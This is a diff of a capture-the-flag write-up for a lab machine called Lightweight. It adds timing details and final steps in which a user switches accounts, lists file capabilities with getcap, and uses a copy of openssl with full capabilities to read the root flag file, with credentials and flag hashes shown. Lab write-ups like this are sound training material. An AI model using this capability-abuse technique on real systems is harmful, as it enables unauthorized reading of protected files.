@@ -9,11 +9,11 @@
 **OS :** Linux
 
 ##### **Conclusion**
-**Time :** 
+**Time :** 2h15
 	**Start :** 24.04.2025 18:26
 	**Break at/to :** 24.04.2025 19:32 / 24.04.2025 20:15 | 24.04.2025 20:45 / 25.04.2025 17:00
-	**Finish :**
-**Satisfaction :**  
+	**Finish :** 25.04.2025 17:39
+**Satisfaction :**  8/10
 ### 1. **Reconnaissance**
 
 We start with an #nmap scan :
@@ -249,7 +249,6 @@ In the file status.php we find this :
 $username = 'ldapuser1';
 $password = 'f3ca9d298a553da117442deeb6fa932d';
 ```
-
 ## 5. **Installation**
 
 ## 6. **Command and Control**
@@ -263,3 +262,38 @@ Flag for ldapuser2 :
 d0e63c6553c027f227b9a728908d98e5
 ```
 
+For ldapuser1 :
+
+```BASH
+[ldapuser2@lightweight ~]$ su ldapuser1
+Password: 
+[ldapuser1@lightweight ldapuser2]$ cd ..
+[ldapuser1@lightweight home]$ ls
+10.10.14.145  10.10.14.2  127.0.0.1  ldapuser1	ldapuser2
+[ldapuser1@lightweight home]$ cd ldapuser1
+[ldapuser1@lightweight ~]$ ls
+capture.pcap  ldapTLS.php  openssl  tcpdump
+```
+
+hmmm...
+
+```BASH
+[ldapuser1@lightweight ~]$ getcap -r / 2>/dev/null
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/sbin/mtr = cap_net_raw+ep
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
+/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep
+/home/ldapuser1/openssl =ep
+```
+
+OpenSSL have full access.
+
+```BASH
+[ldapuser1@lightweight /]$ /home/ldapuser1/openssl enc -in /root/root.txt
+70924cf0667553a366b26ea3a17d8f6e
+```
+
+There's our flag.
